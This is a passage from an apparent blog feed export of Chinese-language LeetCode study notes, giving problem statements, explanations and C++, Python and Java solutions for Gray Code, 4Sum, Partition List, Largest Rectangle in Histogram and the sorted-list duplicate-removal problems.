class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; &amp;res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums, <span class="keyword">int</span> n, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;vec, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        res.push_back(vec);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = position; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i&gt;position)&amp;&amp;(nums[i]==nums[i<span class="number">-1</span>]))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                vec.push_back(nums[i]);</span><br><span class="line">                subsetsWithDupHelper(res, nums, n, vec, i + <span class="number">1</span>);</span><br><span class="line">                vec.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[89. Gray Code]]></title>
      <url>/wiki/2017/10/30/Leetcode-89-Gray-Code/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The gray code is a binary numeral system where two successive values differ in only one bit.</p>
<p>Given a non-negative integer $n$ representing the total number of bits in the code, print the sequence of gray code. A gray code sequence must begin with 0.</p>
<p>For example, given $n = 2$, return <code>[0,1,3,2]</code>. Its gray code sequence is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 - 0</span><br><span class="line">01 - 1</span><br><span class="line">11 - 3</span><br><span class="line">10 - 2</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:<br>For a given $n$, a gray code sequence is not uniquely defined.</p>
<p>For example, <code>[0,2,3,1]</code> is also a valid gray code sequence according to the above definition.</p>
<p>For now, the judge is able to judge based on one instance of gray code sequence. Sorry about that.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>gray code 的wikipedia页面<a href="https://en.wikipedia.org/wiki/Gray_code#Constructing_an_n-bit_Gray_code">在此</a>。</p>
<p>例举grey code序列，并找规律 :</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/gray code.png" alt="gray code"></p>
<p>以$n = 3$为例，grey code中前4个包括了$n = 2$的所有gray code。后4个则是前4个逆序后加上$2^2$。</p>
<p>推广：$n = i$的grey code的前一半包括了$n = i-1$的所有grey code，而后一半则为前一半逆序后加上$2^{(i-1)}$。</p>
<p>在写程序的过程中，特别要注意res的index 以及$i$，$j$的关系。主要是细节问题。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// a non-negative integer n: the total number of bits in the code</span></span><br><span class="line">    <span class="comment">// print the sequence of gray code. </span></span><br><span class="line">    <span class="comment">// A gray code sequence must begin with 0.</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; grayCode(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        res.push_back(<span class="number">0</span>); <span class="comment">// when n=0, gray code = 0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="built_in">pow</span>(<span class="number">2</span>,i<span class="number">-1</span>); j&lt; <span class="built_in">pow</span>(<span class="number">2</span>,i); j++)&#123;</span><br><span class="line">                res.push_back(res[<span class="built_in">pow</span>(<span class="number">2</span>,i)-j<span class="number">-1</span>]+<span class="built_in">pow</span>(<span class="number">2</span>, i<span class="number">-1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实还有一种非常简单的方法，直接从数学角度出发的，但需要首先了解gray code。其实在二进制数和gray code之间有转换关系：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function converts an unsigned binary</span></span><br><span class="line"><span class="comment"> * number to reflected binary Gray code.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The operator &gt;&gt; is shift right. The operator ^ is exclusive or.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">BinaryToGray</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num ^ (num &gt;&gt; <span class="number">1</span>); <span class="comment">//与右移一位的数字按位异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[18. 4 Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-18-4-Sum/</url>
      <content type="html"><![CDATA[<p>Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.</p>
<p><strong>Note</strong>: The solution set must not contain duplicate quadruplets.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">For example, given array S = [1, 0, -1, 0, -2, 2], and target = 0.</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-1,  0, 0, 1],</span><br><span class="line">  [-2, -1, 1, 2],</span><br><span class="line">  [-2,  0, 0, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>思路其实非常简单，无非是把4Sum问题转化为3Sum问题。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fourSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 特殊情况，数字个数小于4</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        results = []</span><br><span class="line">        <span class="keyword">while</span> i &lt; n<span class="number">-3</span>:</span><br><span class="line">            self.threesum(nums[i+<span class="number">1</span>:], target-nums[i], nums[i], results)</span><br><span class="line">            </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># repeat situation</span></span><br><span class="line">            <span class="keyword">while</span> (i&lt;n<span class="number">-3</span>) <span class="keyword">and</span> (nums[i] == nums[i<span class="number">-1</span>]):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threesum</span><span class="params">(self, nums, target, first,  results)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="keyword">while</span> i &lt; n<span class="number">-2</span>:</span><br><span class="line">            left = i + <span class="number">1</span></span><br><span class="line">            right = n<span class="number">-1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> left &lt; right:</span><br><span class="line">                val = nums[i] + nums[left] + nums[right]</span><br><span class="line">                <span class="keyword">if</span> val == target:</span><br><span class="line">                    results.append([first, nums[i], nums[left], nums[right]])</span><br><span class="line">                    print([first, nums[i], nums[left], nums[right]])</span><br><span class="line">                    left += <span class="number">1</span></span><br><span class="line">                    right -= <span class="number">1</span></span><br><span class="line">                    <span class="comment"># repeat situation</span></span><br><span class="line">                    <span class="keyword">while</span> (left&lt; right) <span class="keyword">and</span> (nums[left]==nums[left<span class="number">-1</span>]):</span><br><span class="line">                        left += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> (left&lt;right) <span class="keyword">and</span> (nums[right]==nums[right+<span class="number">1</span>]):</span><br><span class="line">                        right -= <span class="number">1</span></span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">elif</span> val &lt; target:</span><br><span class="line">                    left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    right -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="comment"># repeat situation</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; n <span class="number">-2</span>) <span class="keyword">and</span> nums[i] == nums[i<span class="number">-1</span>]:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[86. Partition List]]></title>
      <url>/wiki/2017/10/30/Leetcode-86-Partition-List/</url>
      <content type="html"><![CDATA[<p>Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.</p>
<p>You should preserve the original relative order of the nodes in each of the two partitions.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3</span><br><span class="line">Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a linked list and a value x, partition it, such that</span></span><br><span class="line"><span class="comment"> * all nodes less than x come before nodes greater than or equal to x.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * You should preserve the original relative order of</span></span><br><span class="line"><span class="comment"> * the nodes in each of the two partitions.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Example:</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3</span></span><br><span class="line"><span class="comment"> * Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/partition-list/description/</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment"> * 这道题目看起来思路是非常简单的，就是要注意细节。</span></span><br><span class="line"><span class="comment"> * 解决方案是将大于x的元素放到另一个链表中，最后将两个链表连接起来。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 需要注意的有以下几点：</span></span><br><span class="line"><span class="comment"> * 1. 链表头部元素可能会大于x，为了方便，引入dummy node</span></span><br><span class="line"><span class="comment"> * 2. 要在新建链表尾部放null，很容易忘记</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q86PartitionList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title">partition</span><span class="params">(ListNode head, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// another list for nodes (node.val &gt;= x).</span></span><br><span class="line">        <span class="comment">// add ListNode(0) as a dummy node</span></span><br><span class="line">        ListNode head1 = <span class="keyword">new</span> ListNode(<span class="number">0</span>), head2 = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        head1.next = head;</span><br><span class="line">        ListNode pos = head1.next, prev = head1, tmp = head2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (pos != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// find notes, whose value if greater or equal than x,</span></span><br><span class="line">            <span class="comment">// then remove them from head1 and put them in head2 in order,</span></span><br><span class="line">            <span class="keyword">if</span> (pos.val &gt;= x) &#123;</span><br><span class="line">                <span class="comment">// put it in head2</span></span><br><span class="line">                head2.next = pos;</span><br><span class="line">                head2 = head2.next;</span><br><span class="line">                <span class="comment">// remove it from head</span></span><br><span class="line">                prev.next = pos.next;</span><br><span class="line">                <span class="comment">// prev unchanged; no code</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// change prev</span></span><br><span class="line">                prev = pos;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// change pos</span></span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125; <span class="comment">// end while</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 别忘了结束链表</span></span><br><span class="line">        head2.next = <span class="keyword">null</span>;</span><br><span class="line">        prev.next = tmp.next;</span><br><span class="line">        <span class="keyword">return</span> head1.next;</span><br><span class="line">    &#125; <span class="comment">//end method partition</span></span><br><span class="line">&#125; <span class="comment">// end class</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[85. Maximal Rectangle]]></title>
      <url>/wiki/2017/10/30/Leetcode-85-Maximal-Rectangle/</url>
      <content type="html"><![CDATA[<p>Given a 2D binary matrix filled with 0’s and 1’s, find the largest rectangle containing only 1’s and return its area.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;],</span><br><span class="line">  [&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;]</span><br><span class="line">]</span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[84. Largest Rectangle in Histogram]]></title>
      <url>/wiki/2017/10/30/Leetcode-84-Largest-Rectangle-in-Histogram/</url>
      <content type="html"><![CDATA[<p>Given $n$ non-negative integers representing the histogram’s bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15391517664139.jpg" alt=""></p>
<p>Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].</p>
<p> <img src="http://or9a8nskt.bkt.clouddn.com/15391517753651.jpg" alt=""></p>
<p>The largest rectangle is shown in the shaded area, which has area = 10 unit.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,1,5,6,2,3]</span><br><span class="line">Output: 10</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实挺难的，一看到题目的时候根本不知道用什么好的解决方法。这里巧妙的利用的stack。stack里存放的是依次递增的数组。当数组依次递增的时候，当前的数字肯定不是右边界，所以不需要求最大面积，只需要依次入栈(<code>stack.push(i)</code>)。当遇到递减的元素的时候(<code>heights[stack.peek()] &gt;= cur</code>)，需要停下来求一下面积。首先找到右边界，既然这个数字是减小了的，那么右边界肯定不是它，而是前面的那个数字(<code>i-1</code>)。那么左边界呢？我们构造一个循环，依次弹出栈顶元素，如果它比当当前值要小，那肯定不是；否则依次求其面积(<code>h * w</code>)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * find the area of largest rectangle in the histogram</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> heights: an array of non-negative integers</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>: the area of largest rectangle in the histogram</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(<span class="keyword">int</span>[] heights)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (heights == <span class="keyword">null</span> || heights.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= heights.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> cur = (i == heights.length) ? -<span class="number">1</span> : heights[i];</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; heights[stack.peek()] &gt;= cur) &#123;</span><br><span class="line">            <span class="keyword">int</span> h = heights[stack.pop()];</span><br><span class="line">            <span class="keyword">int</span> w = stack.isEmpty() ? i : i - stack.peek() - <span class="number">1</span>;</span><br><span class="line">            ans = Math.max(ans, h * w);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>reference: <a href="https://www.geeksforgeeks.org/largest-rectangle-under-histogram/">https://www.geeksforgeeks.org/largest-rectangle-under-histogram/</a></p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[83. Remove Duplicates from Sorted List]]></title>
      <url>/wiki/2017/10/30/Leetcode-83-Remove-Duplicates-from-Sorted-List/</url>
      <content type="html"><![CDATA[<p>Given a sorted linked list, delete all duplicates such that each element appear only once.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;2</span><br><span class="line">Output: 1-&gt;2</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: 1-&gt;1-&gt;2-&gt;3-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a sorted linked list, delete all duplicates such that each element appear only once.</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-duplicates-from-sorted-list/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 由于链表是排序过的，那么直接比较相邻元素就可以发现重复的元素了，然后删除后面的重复元素。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> the Linked list is SORTED! Just compare adjacnet node to find repeat values.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q83RemoveDuplicatesFromSortedList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next==<span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        <span class="keyword">while</span> (pos.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// comparing adjacnet listnodes</span></span><br><span class="line">            <span class="keyword">if</span> (pos.next.val == pos.val) &#123;</span><br><span class="line">                pos.next = pos.next.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pos = pos.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//int[] a = new int[]&#123;1,1,2,3,3&#125;;</span></span><br><span class="line">        LinkedList list = <span class="keyword">new</span> LinkedList(a);</span><br><span class="line">        list.print();</span><br><span class="line">        Q83RemoveDuplicatesFromSortedList q83 = <span class="keyword">new</span> Q83RemoveDuplicatesFromSortedList();</span><br><span class="line">        q83.deleteDuplicates(list.head);</span><br><span class="line">        list.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[82. Remove Duplicates from Sorted List II]]></title>
      <url>/wiki/2017/10/30/Leetcode-82-Remove-Duplicates-from-Sorted-List-II/</url>
      <content type="html"><![CDATA[<p>Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5</span><br><span class="line">Output: 1-&gt;2-&gt;5</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;1-&gt;1-&gt;2-&gt;3</span><br><span class="line">Output: 2-&gt;3</span><br></pre></td></tr></table></figure>
